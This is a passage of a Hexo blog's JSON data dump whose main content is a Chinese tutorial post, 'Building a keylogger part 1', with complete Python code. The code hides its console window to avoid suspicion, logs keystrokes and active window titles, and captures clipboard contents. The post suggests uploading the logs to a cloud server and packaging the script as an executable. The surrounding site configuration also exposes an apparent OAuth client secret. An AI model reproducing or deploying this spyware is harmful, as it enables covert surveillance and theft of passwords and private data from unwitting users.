enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":""},{"title":"分类","date":"2018-01-04T16:00:00.000Z","type":"categories","_content":"","source":"tags/index-1.md","raw":"---\ntitle: 分类\ndate: 2018-01-05 00:00:00\ntype: \"categories\"\n---\n","updated":"2020-01-09T14:18:33.000Z","path":"tags/index-1.html","comments":1,"layout":"page","_id":"cknr54xhv000z8ot9l7x5xzq7","content":"","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":""}],"Post":[{"title":"建立键盘记录器part1","description":"使用python编写键盘记录器.","_content":"\n>如想有更好的了解请查看[原文](https://0x00sec.org/t/malware-writing-python-malware-part-1/11700)\n\n### 导入标准库，隐藏控制台窗口\n\n导入提供所需功能的Windows DLL。所需`kernel32.dll`与`user32.dll`，为避免怀疑隐藏控制台窗口。\n\t\n```python\nimport ctypes    #提供C兼容的数据类型\nimport logging   #用于记录键盘记录\n\nkernel32  = ctypes.windll.kernel32    #调用kernel32.dll\nuser32 = ctypes.windll.user32         #调用user32.dll\n\nuser32.ShowWindow(kernel32.GetConsoleWindow(),0)    #隐藏窗口\n```\n\n### get_current_window()\n\n获取当前窗口标题，以便知道记录的是用户使用的哪个程序。\n\t\n```python\ndef get_current_window():    #抓取当前窗口标题\n    #必需的WinAPI函数\n    GetForegroundWindow = user32.GetForegroundWindow\n    GetWindowTextLength = user32.GetWindowTextLengthW\n    GetWindowText = user32.GetWindowTextW\n\n    hwnd = GetForegroundWindow()    #获取当前窗口句柄\n    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递\n    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本\n\n    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中\n\n    return buff.value    #返回buff的值\n```\n\n### get_clipboard()\n\n捕获剪贴板内容。tips：使用`PyWin32`可以用更少的代码完成些操作\n\n```python\ndef get_clipboard():\n\n    CF_TEXT = 1    #设置剪贴板格式\n\n    #GlobalLock/GlobalUnlock 参数与返回类型\n    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]\n    kernel32.GlobalLock.restype = ctypes.c_void_p\n    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]\n\n    #GetClipboardData的返回类型\n    user32.GetClipboardData.restype = ctypes.c_void_p\n    user32.OpenClipboard(0)\n\n    #所需剪贴板函数\n    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable\n    GetClipboardData = user32.GetClipboardData\n    CloseClipboard = user32.CloseClipboard\n\n    try:\n        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用\n            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄\n            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针\n            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针\n            value = text.value    #存储有用的值\n            kernel32.GlobalUnlock(data_locked)    #递减锁计数\n            return value.decode('utf-8')    #返回剪贴板的值\n    finally:\n        CloseClipboard()    #关闭剪贴板\n```\n\n### get_keystrokes()\n\n监听并记录敲击字符并记录。函数调用时需传入两个参数，日志文件存储目录和文件名。\n按键记录使用`while`死循环，原因不希望键盘记录停止。但如果我们要同时执行其他任务，则需要使用多线程或单独的进程中与其他函数一并运行它。\n\n```python\ndef get_keystrokes(log_dir,log_name):    #监听与记录敲击键盘内容\n    #记录\n    logging.basicConfig(filename=(log_dir + '\\\\' + log_name),level=logging.DEBUG,format='%(message)s')\n\n    GetAsyncKeyState = user32.GetAsyncKeyState    #WinAPI函数，确定按键是向上还是向下\n    special_keys = {\n        0x08: 'BS',\n        0x09: 'Tap',\n        0x10: 'Shift',\n        0x11: 'Ctrl',\n        0x12: 'Alt',\n        0x14: 'CapsLock',\n        0x1b: 'Esc',\n        0x20: 'Space',\n        0x2e: 'Del',\n    }\n    current_window = None\n    line = []    #存储点击的字符\n\n    while True:\n        if current_window != get_current_window():    #判断current_window内容不是当前打开的窗口\n            current_window = get_current_window()    #将窗口标题放在current_window中\n            logging.info(str(current_window))    #将当前窗口标题写入日志文件\n\n        for i in range(1,256):    #256个ASCII字符\n            if GetAsyncKeyState(i) & 1:    #如果点击某个键并匹配ASCII字符\n                if i in special_keys:    #如果是特殊键，这样记录\n                    logging.info(\"<{}>\".format(special_keys[i]))\n                elif i == 0x0d:    #如果键入<ENTER>，则记录然后清除行变量\n                    logging.info(line)\n                    line.clear()\n                elif i ==0x63 or i == 0x43 or i == 0x56 or i ==0x76:    #如果点击字符'c'或'v'，则获取剪贴板数据\n                    clipboard_data = get_clipboard()\n                    logging.info(\"[CLIPBOARD] {}\".format(clipboard_data))\n                elif 0x30 <= i <= 0x5a:    #如果是字母数字字符，则追加到line\n                    line.append(chr(i))\n```\n\n后续可自加代码，如定时将记录文件上传到云服务器 :grin: \n\n将py文件用pyinstaller打包成exe并运行，因为使用while True死循环，cpu占用较高，这点将在part2解决。\n\n![part1_1](https://yui77111.github.io/assets/images/article/python/1_1.png)\n\n![part1_2](https://yui77111.github.io/assets/images/article/python/1_2.png)\n\n![part1_3](https://yui77111.github.io/assets/images/article/python/1_3.png)\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/keylogger/part1.py)","source":"_posts/2019-07-20-建立键盘记录器part1.md","raw":"---\ntitle: 建立键盘记录器part1\ndescription: 使用python编写键盘记录器.\ncategories:\n - python\ntags: \n - python\n - 渗透测试\n---\n\n>如想有更好的了解请查看[原文](https://0x00sec.org/t/malware-writing-python-malware-part-1/11700)\n\n### 导入标准库，隐藏控制台窗口\n\n导入提供所需功能的Windows DLL。所需`kernel32.dll`与`user32.dll`，为避免怀疑隐藏控制台窗口。\n\t\n```python\nimport ctypes    #提供C兼容的数据类型\nimport logging   #用于记录键盘记录\n\nkernel32  = ctypes.windll.kernel32    #调用kernel32.dll\nuser32 = ctypes.windll.user32         #调用user32.dll\n\nuser32.ShowWindow(kernel32.GetConsoleWindow(),0)    #隐藏窗口\n```\n\n### get_current_window()\n\n获取当前窗口标题，以便知道记录的是用户使用的哪个程序。\n\t\n```python\ndef get_current_window():    #抓取当前窗口标题\n    #必需的WinAPI函数\n    GetForegroundWindow = user32.GetForegroundWindow\n    GetWindowTextLength = user32.GetWindowTextLengthW\n    GetWindowText = user32.GetWindowTextW\n\n    hwnd = GetForegroundWindow()    #获取当前窗口句柄\n    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递\n    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本\n\n    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中\n\n    return buff.value    #返回buff的值\n```\n\n### get_clipboard()\n\n捕获剪贴板内容。tips：使用`PyWin32`可以用更少的代码完成些操作\n\n```python\ndef get_clipboard():\n\n    CF_TEXT = 1    #设置剪贴板格式\n\n    #GlobalLock/GlobalUnlock 参数与返回类型\n    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]\n    kernel32.GlobalLock.restype = ctypes.c_void_p\n    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]\n\n    #GetClipboardData的返回类型\n    user32.GetClipboardData.restype = ctypes.c_void_p\n    user32.OpenClipboard(0)\n\n    #所需剪贴板函数\n    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable\n    GetClipboardData = user32.GetClipboardData\n    CloseClipboard = user32.CloseClipboard\n\n    try:\n        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用\n            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄\n            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针\n            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针\n            value = text.value    #存储有用的值\n            kernel32.GlobalUnlock(data_locked)    #递减锁计数\n            return value.decode('utf-8')    #返回剪贴板的值\n    finally:\n        CloseClipboard()    #关闭剪贴板\n```\n\n### get_keystrokes()\n\n监听并记录敲击字符并记录。函数调用时需传入两个参数，日志文件存储目录和文件名。\n按键记录使用`while`死循环，原因不希望键盘记录停止。但如果我们要同时执行其他任务，则需要使用多线程或单独的进程中与其他函数一并运行它。\n\n```python\ndef get_keystrokes(log_dir,log_name):    #监听与记录敲击键盘内容\n    #记录\n    logging.basicConfig(filename=(log_dir + '\\\\' + log_name),level=logging.DEBUG,format='%(message)s')\n\n    GetAsyncKeyState = user32.GetAsyncKeyState    #WinAPI函数，确定按键是向上还是向下\n    special_keys = {\n        0x08: 'BS',\n        0x09: 'Tap',\n        0x10: 'Shift',\n        0x11: 'Ctrl',\n        0x12: 'Alt',\n        0x14: 'CapsLock',\n        0x1b: 'Esc',\n        0x20: 'Space',\n        0x2e: 'Del',\n    }\n    current_window = None\n    line = []    #存储点击的字符\n\n    while True:\n        if current_window != get_current_window():    #判断current_window内容不是当前打开的窗口\n            current_window = get_current_window()    #将窗口标题放在current_window中\n            logging.info(str(current_window))    #将当前窗口标题写入日志文件\n\n        for i in range(1,256):    #256个ASCII字符\n            if GetAsyncKeyState(i) & 1:    #如果点击某个键并匹配ASCII字符\n                if i in special_keys:    #如果是特殊键，这样记录\n                    logging.info(\"<{}>\".format(special_keys[i]))\n                elif i == 0x0d:    #如果键入<ENTER>，则记录然后清除行变量\n                    logging.info(line)\n                    line.clear()\n                elif i ==0x63 or i == 0x43 or i == 0x56 or i ==0x76:    #如果点击字符'c'或'v'，则获取剪贴板数据\n                    clipboard_data = get_clipboard()\n                    logging.info(\"[CLIPBOARD] {}\".format(clipboard_data))\n                elif 0x30 <= i <= 0x5a:    #如果是字母数字字符，则追加到line\n                    line.append(chr(i))\n```\n\n后续可自加代码，如定时将记录文件上传到云服务器 :grin: \n\n将py文件用pyinstaller打包成exe并运行，因为使用while True死循环，cpu占用较高，这点将在part2解决。\n\n![part1_1](https://yui77111.github.io/assets/images/article/python/1_1.png)\n\n![part1_2](https://yui77111.github.io/assets/images/article/python/1_2.png)\n\n![part1_3](https://yui77111.github.io/assets/images/article/python/1_3.png)\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/keylogger/part1.py)","slug":"2019-07-20-建立键盘记录器part1","published":1,"date":"2021-04-21T07:29:10.947Z","updated":"2020-07-24T03:56:40.651Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xgx00028ot9vxff82qp","content":"<blockquote>\n<p>如想有更好的了解请查看<a href=\"https://0x00sec.org/t/malware-writing-python-malware-part-1/11700\" target=\"_blank\" rel=\"noopener\">原文</a></p>\n</blockquote>\n<h3 id=\"导入标准库，隐藏控制台窗口\"><a href=\"#导入标准库，隐藏控制台窗口\" class=\"headerlink\" title=\"导入标准库，隐藏控制台窗口\"></a>导入标准库，隐藏控制台窗口</h3><p>导入提供所需功能的Windows DLL。所需<code>kernel32.dll</code>与<code>user32.dll</code>，为避免怀疑隐藏控制台窗口。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ctypes    <span class=\"comment\">#提供C兼容的数据类型</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> logging   <span class=\"comment\">#用于记录键盘记录</span></span><br><span class=\"line\"></span><br><span class=\"line\">kernel32  = ctypes.windll.kernel32    <span class=\"comment\">#调用kernel32.dll</span></span><br><span class=\"line\">user32 = ctypes.windll.user32         <span class=\"comment\">#调用user32.dll</span></span><br><span class=\"line\"></span><br><span class=\"line\">user32.ShowWindow(kernel32.GetConsoleWindow(),<span class=\"number\">0</span>)    <span class=\"comment\">#隐藏窗口</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-current-window\"><a href=\"#get-current-window\" class=\"headerlink\" title=\"get_current_window()\"></a>get_current_window()</h3><p>获取当前窗口标题，以便知道记录的是用户使用的哪个程序。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_current_window</span><span class=\"params\">()</span>:</span>    <span class=\"comment\">#抓取当前窗口标题</span></span><br><span class=\"line\">    <span class=\"comment\">#必需的WinAPI函数</span></span><br><span class=\"line\">    GetForegroundWindow = user32.GetForegroundWindow</span><br><span class=\"line\">    GetWindowTextLength = user32.GetWindowTextLengthW</span><br><span class=\"line\">    GetWindowText = user32.GetWindowTextW</span><br><span class=\"line\"></span><br><span class=\"line\">    hwnd = GetForegroundWindow()    <span class=\"comment\">#获取当前窗口句柄</span></span><br><span class=\"line\">    length = GetWindowTextLength(hwnd)    <span class=\"comment\">#获取标题文本长度，将句柄乍为参数传递</span></span><br><span class=\"line\">    buff = ctypes.create_unicode_buffer(length + <span class=\"number\">1</span>)    <span class=\"comment\">#创建临时缓存buff用于存储标题文本</span></span><br><span class=\"line\"></span><br><span class=\"line\">    GetWindowText(hwnd, buff, length + <span class=\"number\">1</span>)    <span class=\"comment\">#获取窗口标题并存储在buff中</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buff.value    <span class=\"comment\">#返回buff的值</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-clipboard\"><a href=\"#get-clipboard\" class=\"headerlink\" title=\"get_clipboard()\"></a>get_clipboard()</h3><p>捕获剪贴板内容。tips：使用<code>PyWin32</code>可以用更少的代码完成些操作</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_clipboard</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    CF_TEXT = <span class=\"number\">1</span>    <span class=\"comment\">#设置剪贴板格式</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GlobalLock/GlobalUnlock 参数与返回类型</span></span><br><span class=\"line\">    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\">    kernel32.GlobalLock.restype = ctypes.c_void_p</span><br><span class=\"line\">    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GetClipboardData的返回类型</span></span><br><span class=\"line\">    user32.GetClipboardData.restype = ctypes.c_void_p</span><br><span class=\"line\">    user32.OpenClipboard(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#所需剪贴板函数</span></span><br><span class=\"line\">    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable</span><br><span class=\"line\">    GetClipboardData = user32.GetClipboardData</span><br><span class=\"line\">    CloseClipboard = user32.CloseClipboard</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> IsClipboardFormatAvailable(CF_TEXT):    <span class=\"comment\">#如果CF_TEXT可用</span></span><br><span class=\"line\">            data = GetClipboardData(CF_TEXT)    <span class=\"comment\">#获取剪贴板数据的句柄</span></span><br><span class=\"line\">            data_locked = kernel32.GlobalLock(data)    <span class=\"comment\">#获取指向数据所在的内存位置的指针</span></span><br><span class=\"line\">            text = ctypes.c_char_p(data_locked)    <span class=\"comment\">#获取指向data_locked位置的char*(python中的字符串)指针</span></span><br><span class=\"line\">            value = text.value    <span class=\"comment\">#存储有用的值</span></span><br><span class=\"line\">            kernel32.GlobalUnlock(data_locked)    <span class=\"comment\">#递减锁计数</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> value.decode(<span class=\"string\">'utf-8'</span>)    <span class=\"comment\">#返回剪贴板的值</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        CloseClipboard()    <span class=\"comment\">#关闭剪贴板</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-keystrokes\"><a href=\"#get-keystrokes\" class=\"headerlink\" title=\"get_keystrokes()\"></a>get_keystrokes()</h3><p>监听并记录敲击字符并记录。函数调用时需传入两个参数，日志文件存储目录和文件名。<br>按键记录使用<code>while</code>死循环，原因不希望键盘记录停止。但如果我们要同时执行其他任务，则需要使用多线程或单独的进程中与其他函数一并运行它。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_keystrokes</span><span class=\"params\">(log_dir,log_name)</span>:</span>    <span class=\"comment\">#监听与记录敲击键盘内容</span></span><br><span class=\"line\">    <span class=\"comment\">#记录</span></span><br><span class=\"line\">    logging.basicConfig(filename=(log_dir + <span class=\"string\">'\\\\'</span> + log_name),level=logging.DEBUG,format=<span class=\"string\">'%(message)s'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    GetAsyncKeyState = user32.GetAsyncKeyState    <span class=\"comment\">#WinAPI函数，确定按键是向上还是向下</span></span><br><span class=\"line\">    special_keys = &#123;</span><br><span class=\"line\">        <span class=\"number\">0x08</span>: <span class=\"string\">'BS'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x09</span>: <span class=\"string\">'Tap'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x10</span>: <span class=\"string\">'Shift'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x11</span>: <span class=\"string\">'Ctrl'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x12</span>: <span class=\"string\">'Alt'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x14</span>: <span class=\"string\">'CapsLock'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x1b</span>: <span class=\"string\">'Esc'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"string\">'Space'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x2e</span>: <span class=\"string\">'Del'</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    current_window = <span class=\"literal\">None</span></span><br><span class=\"line\">    line = []    <span class=\"comment\">#存储点击的字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_window != get_current_window():    <span class=\"comment\">#判断current_window内容不是当前打开的窗口</span></span><br><span class=\"line\">            current_window = get_current_window()    <span class=\"comment\">#将窗口标题放在current_window中</span></span><br><span class=\"line\">            logging.info(str(current_window))    <span class=\"comment\">#将当前窗口标题写入日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">256</span>):    <span class=\"comment\">#256个ASCII字符</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> GetAsyncKeyState(i) &amp; <span class=\"number\">1</span>:    <span class=\"comment\">#如果点击某个键并匹配ASCII字符</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> special_keys:    <span class=\"comment\">#如果是特殊键，这样记录</span></span><br><span class=\"line\">                    logging.info(<span class=\"string\">\"&lt;&#123;&#125;&gt;\"</span>.format(special_keys[i]))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> i == <span class=\"number\">0x0d</span>:    <span class=\"comment\">#如果键入&lt;ENTER&gt;，则记录然后清除行变量</span></span><br><span class=\"line\">                    logging.info(line)</span><br><span class=\"line\">                    line.clear()</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> i ==<span class=\"number\">0x63</span> <span class=\"keyword\">or</span> i == <span class=\"number\">0x43</span> <span class=\"keyword\">or</span> i == <span class=\"number\">0x56</span> <span class=\"keyword\">or</span> i ==<span class=\"number\">0x76</span>:    <span class=\"comment\">#如果点击字符'c'或'v'，则获取剪贴板数据</span></span><br><span class=\"line\">                    clipboard_data = get_clipboard()</span><br><span class=\"line\">                    logging.info(<span class=\"string\">\"[CLIPBOARD] &#123;&#125;\"</span>.format(clipboard_data))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"number\">0x30</span> &lt;= i &lt;= <span class=\"number\">0x5a</span>:    <span class=\"comment\">#如果是字母数字字符，则追加到line</span></span><br><span class=\"line\">                    line.append(chr(i))</span><br></pre></td></tr></table></figure>\n\n<p>后续可自加代码，如定时将记录文件上传到云服务器 :grin: </p>\n<p>将py文件用pyinstaller打包成exe并运行，因为使用while True死循环，cpu占用较高，这点将在part2解决。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_1.png\" alt=\"part1_1\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_2.png\" alt=\"part1_2\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_3.png\" alt=\"part1_3\"></p>\n<p>源代码已上传致<a href=\"https://github.com/yui77111/python-malware/blob/master/keylogger/part1.py\" target=\"_blank\" rel=\"noopener\">gayhub</a></p>\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: 